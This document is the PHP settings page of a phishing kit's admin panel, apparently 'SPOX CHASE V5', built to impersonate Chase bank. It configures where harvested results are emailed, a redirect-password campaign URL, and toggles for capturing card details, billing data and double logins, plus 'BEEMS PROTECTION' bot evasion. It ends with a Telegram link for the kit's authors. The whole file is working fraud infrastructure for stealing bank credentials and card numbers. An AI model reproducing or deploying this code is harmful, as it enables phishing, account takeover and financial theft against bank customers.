<?php
error_reporting(0);
session_start();
include'../spox_bot.php';
if (!isset($_SESSION['admino'])) {
  header("location: ../admin/");
}
if(!isset($_SESSION['login'])) {
    header("location: login.php");
}
?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>SPOX CHASE | Settings</title>
  <link rel="icon" href="files/logo.jpg" type="image/png">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700">
  <link rel="stylesheet" href="files/assets/vendor/nucleo/css/nucleo.css" type="text/css">
  <link rel="stylesheet" href="files/assets/vendor/%40fortawesome/fontawesome-free/css/all.min.css" type="text/css">
  <link rel="stylesheet" href="files/assets/css/argon.min5438.css?v=1.2.0" type="text/css">
</head>

<body>
<style type="text/css">

.bg-gradient-az{
  background: linear-gradient(87deg,#633b56 0,#f56036 100%)!important;
}.bg-gradient-ze {
    background: linear-gradient(87deg,#755f63 0,#e0d447 100%)!important;
}.bg-gradient-er {
    background: linear-gradient(87deg,#2dce89 0,#612e22 100%)!important;
}
@media only screen and (max-width: 600px) {
  .col {
      max-width: 25%;
  }
}

</style>
  <nav class="sidenav navbar navbar-vertical  fixed-left  navbar-expand-xs navbar-light bg-white" id="sidenav-main">
    <div class="scrollbar-inner">
      <!-- Brand -->
      <div class="sidenav-header  d-flex  align-items-center">
        <a class="navbar-brand" href="">
          <img src="files/logo.jpg" class="navbar-brand-img" alt="...">
        </a>
        <div class=" ml-auto ">
          <!-- Sidenav toggler -->
          <div class="sidenav-toggler d-none d-xl-block" data-action="sidenav-unpin" data-target="#sidenav-main">
            <div class="sidenav-toggler-inner">
              <i class="sidenav-toggler-line"></i>
              <i class="sidenav-toggler-line"></i>
              <i class="sidenav-toggler-line"></i>
            </div>
          </div>
        </div>
      </div>
      <div class="navbar-inner">
        <!-- Collapse -->
        <div class="collapse navbar-collapse" id="sidenav-collapse-main">
          <!-- Nav items -->
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link active" href="index.php" >
                <i class="ni ni-shop text-primary"></i>
                <span class="nav-link-text">Statistic</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="visitor.php" >
                <i class="ni ni-ui-04 text-info"></i>
                <span class="nav-link-text">List Visitor</span>
              </a>
            </li>
             <li class="nav-item">
              <a class="nav-link" href="blocked.php" >
                <i class="fas fa-bug text-red"></i>
                <span class="nav-link-text">List Bot Detected</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="dellet.php?dellet" >
                <i class="fas fa-trash text-dark"></i>
                <span class="nav-link-text">Dellet</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="settings.php" >
                <i class="ni ni-settings text-pink"></i>
                <span class="nav-link-text">Settings</span>
              </a>
            </li>
          </ul>
          <!-- Divider -->
          <hr class="my-3">
          <!-- Heading -->
          <h6 class="navbar-heading p-0 text-muted">
            <span class="docs-normal">@SPOXCODER x BEEMS :xd</span>
          </h6>
        </div>
      </div>
    </div>
  </nav>
  <!-- Main content -->
  <div class="main-content" id="panel">
    <!-- Topnav -->
    <nav class="navbar navbar-top navbar-expand navbar-light bg-secondary border-bottom">
      <div class="container-fluid">
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

          <!-- Navbar links -->
          <ul class="navbar-nav align-items-center  ml-md-auto ">
            <li class="nav-item d-xl-none">
              <!-- Sidenav toggler -->
              <div class="pr-3 sidenav-toggler sidenav-toggler-light" data-action="sidenav-pin" data-target="#sidenav-main">
                <div class="sidenav-toggler-inner">
                  <i class="sidenav-toggler-line"></i>
                  <i class="sidenav-toggler-line"></i>
                  <i class="sidenav-toggler-line"></i>
                </div>
              </div>
            </li>
          </ul>
          <ul class="navbar-nav align-items-center  ml-auto ml-md-0 ">
            <li class="nav-item dropdown">
              <a class="nav-link pr-0" href="#" role="button" >
                <div class="media align-items-center">
                  <span class="avatar avatar-sm rounded-circle">
                    <img alt="Image placeholder" src="files/logo.jpg">
                  </span>
                  <div class="media-body  ml-2  d-none d-lg-block">
                    <span class="mb-0 text-sm  font-weight-bold"> CHASE V5</span>
                  </div>
                </div>
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <!-- Header -->
    <div class="header pb-6">
      <div class="container-fluid">
        <div class="header-body">
          <div class="row align-items-center py-4">
            <div class="col-lg-6 col-7">
              <nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">
                <ol class="breadcrumb breadcrumb-links">
                  <li class="breadcrumb-item"><a href="#"><i class="fas fa-home"></i></a></li>
                  <li class="breadcrumb-item"><a href="#">Settings</a></li>
                </ol>
              </nav>
            </div>

          </div>
        </div>
      </div>
    </div>
    <!-- Page content -->

   <div class="container-fluid mt--6">

      <div class="row">
        <div class="col-lg-6">

          <div class="card-wrapper">
            <!-- Input groups -->

            <div class="card">
              <!-- Card header -->
              <div class="card-header">
                <h3 class="mb-0">Settings</h3>
              </div>

              <!-- Card body -->
               <div class="card-body">
                   <div class="row">
                  <div class="col-lg-8" id="campaign_url">
                    <code>Campaign Url ↓</code><br>
                     <a href="" target="_blank"> https://mydomain.com?chase</a><br><br>
                  </div>
                </div>


                <form method="POST" action="update.php">
                  <div class="form-group">
                    <label class="form-control-label" for="exampleFormControlInput1">EMAIL RESULT * :</label>
                    <input type="email" name="email" class="form-control" value="" >
                  </div>
                  <div class="form-group">
                    <label class="form-control-label" for="exampleFormControlInput1">REDIRECT PASSWORD :</label>
                    <input type="text" class="form-control" id="validationServerUsername" name="redirect_password" value="">
                  </div>
                   <div class="form-group">
                    <label class="form-control-label" for="exampleFormControlInput1">SEND FROM MAIL :</label>
                    <input type="email" class="form-control" name="send_mail" value="">
                  </div>
                  <div class="form-group">
                    <label class="form-control-label" for="exampleFormControlInput1">RESULT PIN :</label>
                    <input type="num" class="form-control" name="result_pin" value="">
                  </div>
                  <button class="btn btn-primary" type="submit">Submit</button>
                  <button type="button" class="btn btn-warning" data-toggle="modal" data-target="#modal-notification">READ</button>
                  <button type="button" class="btn bg-gradient-danger" onclick="spox()">Report a bug</button>
                  <div class="modal fade" id="modal-notification" tabindex="-1" role="dialog" aria-labelledby="modal-notification" style="display: none;" aria-hidden="true">
                    <div class="modal-dialog modal-danger modal-dialog-centered modal-" role="document">
                      <div class="modal-content bg-gradient-danger">
                        <div class="modal-header">
                          <h6 class="modal-title" id="modal-title-notification">Your attention is required</h6>
                          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">×</span>
                          </button>
                        </div>
                        <div class="modal-body">
                          <div class="py-3 text-center">
                            <i class="ni ni-bell-55 ni-3x"></i>
                            <h4 class="heading mt-4">You should read this!</h4>
                            <p>If you want to be appreciated by others, then don't change anything in this script. Please respect me for making this tool from the beginning. ... Fuck u Spox i changed Everything ... A thief who is afraid of thieves....Idiot!!!</p>
                          </div>
                        </div>
                        <div class="modal-footer">
                          <button type="button" class="btn btn-white" onclick="window.location.href='settings.php'">Ok, Got it</button>
                          <button type="button" class="btn btn-link text-white ml-auto" data-dismiss="modal">Close</button>
                        </div>
                      </div>
                    </div>
                  </div>

              </div>
            </div>
            <!-- Dropdowns -->
          </div>
        </div>
<div class="col-lg-6">
<div class="card-wrapper">

<!-- Toggle buttons -->
<div class="card">
<!-- Card header -->
<div class="card-header">
  <h3 class="mb-0">ON | OFF</h3>
</div>
<!-- Card body -->

<div class="card-body">
      <ul class="list-group list-group-flush list my--3">
               <li class="list-group-item px-0">
                <div class="row align-items-center">
                    <div class="col">
                      <h4 class="mb-0">Text result</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-success">
                      <input type="checkbox"  name="textresult">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                    <div class="col">
                      <h4 class="mb-0">BEEMS PROTECTION</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-danger">
                      <input type="checkbox"  name="beemsprotection">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                  </div>
                </li>
                    <li class="list-group-item px-0">
                <div class="row align-items-center">
                    <div class="col">
                      <h4 class="mb-0">Mail result</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-success">
                      <input type="checkbox"  name="mailresult">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                    <div class="col">
                      <h4 class="mb-0">One Access</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle">
                      <input type="checkbox"  name=oneaccess>
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                  </div>
                </li>
              <li class="list-group-item px-0">
                <div class="row align-items-center">
                    <div class="col">
                      <h4 class="mb-0">Redirect ON</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-success">
                      <input type="checkbox"  name="redirect">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                    <div class="col">
                      <h4 class="mb-0">Show CC</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-warning">
                      <input type="checkbox"  name="showcc">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                  </div>
                </li>

               <li class="list-group-item px-0">
                <div class="row align-items-center">
                    <div class="col">
                      <h4 class="mb-0">Double Login</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-info" >
                      <input type="checkbox"  name="doublelogin">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                    <div class="col">
                      <h4 class="mb-0">Show Billing</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-warning">
                      <input type="checkbox"  name="showaccess">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                  </div>
                </li>
                <li class="list-group-item px-0">
                <div class="row align-items-center">
                   <div class="col">
                      <h4 class="mb-0">Double Access</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-info" >
                      <input type="checkbox"  name="doubleaccess">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                    <div class="col">
                      <h4 class="mb-0">Double CC</h4>
                    </div>
                    <div class="col">
                    <label class="custom-toggle custom-toggle-info">
                     <input type="checkbox"  name="doublecc">
                      <span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>
                    </label>
                    </div>
                  </div>
                </li>

              </ul>
              </div>
              </form>
            </div>
            <!-- Sliders -->
          </div>
        </div>
      </div>


  <!-- JS -->
  <script src="files/assets/vendor/jquery/dist/jquery.min.js"></script>
  <script src="files/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <script src="files/assets/vendor/js-cookie/js.cookie.js"></script>
  <script src="files/assets/js/argon.min5438.js?v=1.2.0"></script>
  <?php
$fp = fopen("../spox_bot.php", "r");
$new_line = "";
while (!feof($fp)) {
    $line = fgets($fp);
    $new_line .= $line;
}
preg_match('/\$email\s=\s"(.*?)"/', $new_line, $emailArr);
    preg_match('/\$redirect_password\s=\s"(.*?)"/', $new_line, $redirect_passwordArr);
    preg_match('/\$resultpin\s=\s"(.*?)"/', $new_line, $result_pinArr);
    preg_match('/\$sendfrom\s=\s"(.*?)"/', $new_line, $sendfromArr);
    preg_match('/\$double_login\s=\s"(.*?)"/', $new_line, $double_loginArr);
    preg_match('/\$double_access\s=\s"(.*?)"/', $new_line, $double_accessArr);
    preg_match('/\$double_cc\s=\s"(.*?)"/', $new_line, $double_ccArr);
    preg_match('/\$double_cc\s=\s"(.*?)"/', $new_line, $double_ccArr);
    preg_match('/\$text_result\s=\s"(.*?)"/', $new_line, $text_resultArr);
    preg_match('/\$send_result\s=\s"(.*?)"/', $new_line, $send_resultArr);
    preg_match('/\$redirect\s=\s"(.*?)"/', $new_line, $redirectArr);
    preg_match('/\$onetime\s=\s"(.*?)"/', $new_line, $onetimeArr);
    preg_match('/\$show_cc\s=\s"(.*?)"/', $new_line, $show_ccArr);
    preg_match('/\$show_access\s=\s"(.*?)"/', $new_line, $show_accessArr);
    preg_match('/\$beems_protection\s=\s"(.*?)"/', $new_line, $beems_protectionArr);
fclose($fp);
echo '<script>$("[name=\'email\']").val("'.$emailArr[1].'");</script>';
echo '<script>$("[name=\'redirect_password\']").val("'.$redirect_passwordArr[1].'");</script>';
echo '<script>$("[name=\'send_mail\']").val("'.$sendfromArr[1].'");</script>';
echo '<script>$("[name=\'result_pin\']").val("'.$result_pinArr[1].'");</script>';
$off = false;
$on = true;
echo '<script>$("[name=\'textresult\']").prop("checked", '.${$text_resultArr[1]}.');</script>';
echo '<script>$("[name=\'mailresult\']").prop("checked", '.${$send_resultArr[1]}.');</script>';
echo '<script>$("[name=\'redirect\']").prop("checked", '.${$redirectArr[1]}.');</script>';
echo '<script>$("[name=\'oneaccess\']").prop("checked", '.${$onetimeArr[1]}.');</script>';
echo '<script>$("[name=\'showcc\']").prop("checked", '.${$show_ccArr[1]}.');</script>';
echo '<script>$("[name=\'showaccess\']").prop("checked", '.${$show_accessArr[1]}.');</script>';
echo '<script>$("[name=\'doublecc\']").prop("checked", '.${$double_ccArr[1]}.');</script>';
echo '<script>$("[name=\'doublelogin\']").prop("checked", '.${$double_loginArr[1]}.');</script>';
echo '<script>$("[name=\'doubleaccess\']").prop("checked", '.${$double_accessArr[1]}.');</script>';
echo '<script>$("[name=\'beemsprotection\']").prop("checked", '.${$beems_protectionArr[1]}.');</script>';

?>
  <script type="text/javascript">
    $("#campaign_url a").html("https://"+window.location.host+"?"+$("[name='redirect_password']").val());
    $("#campaign_url a").attr("href", "https://"+window.location.host+"?"+$("[name='redirect_password']").val());
    $("[name='redirect_password']").keyup(function() {
      $("#campaign_url a").html("https://"+window.location.host+"?"+$("[name='redirect_password']").val());
    $("#campaign_url a").attr("href", "https://"+window.location.host+"?"+$("[name='redirect_password']").val());
    });
      function spox() {
        window.open("https://t.me/spoxcoderxbeemss");
      }
  </script>

</body>
</html>